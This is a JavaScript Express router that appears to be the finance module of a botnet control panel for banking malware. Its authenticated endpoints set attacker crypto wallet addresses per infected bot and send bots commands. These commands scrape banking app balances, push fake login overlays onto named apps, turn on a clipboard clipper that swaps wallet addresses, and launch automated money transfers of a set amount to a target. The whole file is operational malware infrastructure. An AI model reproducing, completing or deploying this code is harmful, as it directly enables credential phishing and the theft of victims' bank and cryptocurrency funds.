import { Router } from 'express';
import { requireAuth } from './auth.js';
import { setWallet, getWallet, startAts, scrapeBalance, deployOverlay, enableClipper } from '../finance.js';

export const financeRouter = Router();
financeRouter.use(requireAuth);

financeRouter.get('/wallet/:botId', (req, res) => res.json(getWallet(req.params.botId) || { eth: '', btc: '', trx: '' }));
financeRouter.post('/wallet/:botId', (req, res) => {
  const { eth = '', btc = '', trx = '' } = req.body ?? {};
  setWallet(req.params.botId, { eth, btc, trx });
  res.json({ ok: true });
});
financeRouter.post('/scrape', (req, res) => {
  const { botId, app } = req.body ?? {};
  if (!botId) return res.status(400).json({ error: 'botId required' });
  res.json({ delivered: scrapeBalance(botId, app || '') });
});
financeRouter.post('/overlay', (req, res) => {
  const { botId, app, kind } = req.body ?? {};
  if (!botId) return res.status(400).json({ error: 'botId required' });
  res.json({ delivered: deployOverlay(botId, app || '', kind || 'login') });
});
financeRouter.post('/clipper', (req, res) => {
  const { botId } = req.body ?? {};
  if (!botId) return res.status(400).json({ error: 'botId required' });
  res.json({ delivered: enableClipper(botId) });
});
financeRouter.post('/ats', (req, res) => {
  const { botId, target, amount, currency = 'USD' } = req.body ?? {};
  if (!botId || !amount) return res.status(400).json({ error: 'botId and amount required' });
  res.json({ delivered: startAts({ botId, target: target || '', amount: String(amount), currency }) });
});
